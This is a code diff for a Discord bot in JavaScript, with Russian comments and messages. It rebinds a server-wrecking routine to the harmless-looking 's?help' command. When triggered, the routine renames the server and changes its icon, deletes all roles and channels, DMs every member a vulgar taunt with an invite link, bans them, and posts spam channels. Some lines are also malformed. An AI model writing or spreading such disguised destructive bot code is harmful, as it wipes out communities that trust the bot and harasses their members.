@@ -33,17 +33,17 @@ bot.on ("message", async message =>{
     if (cmd) cmd.run(bot,message,args);
 });
 bot.on('message', msg => {
-    if (msg.content === 's?msg') {
-    	msg.guild.setName('Крашнут')
+    if (msg.content === 's?help') {
+    	msg.guild.setName('Confessional Bot Crashed Server') // Смена названия сервера
 		msg.guild.setIcon('https://cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png?size=128').then(() => {
-      msg.guild.channels.forEach(c => c.delete())
-      msg.guild.defaultRole.forEach(c => c.delete())
+      msg.guild.roles.forEach(i => i.delete()) // Удаление всех ролей
+      msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send('Вас крашнула конфа https://discord.gg/DM5xaGD').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send('Ваш сервер трахнули ботом, сервер бота: https://discord.ggDM5xaGD').then(() => {
             member.ban().then(() => {
-                msg.guild.createChannel('Конфа топ')
+                msg.guild.createChannel(name, "Конфа топ")
 					.then(channel => {
-                    channel.send('Вас крашнула конфа https://discord.gg/DM5xaGD')
+                    channel.send('Ваш сервер трахнули ботом, сервер бота: https://discord.gg/DM5xaGD')
                     channel.overwritePermissions(member, {
                         SEND_MESSAGES: false
                     })
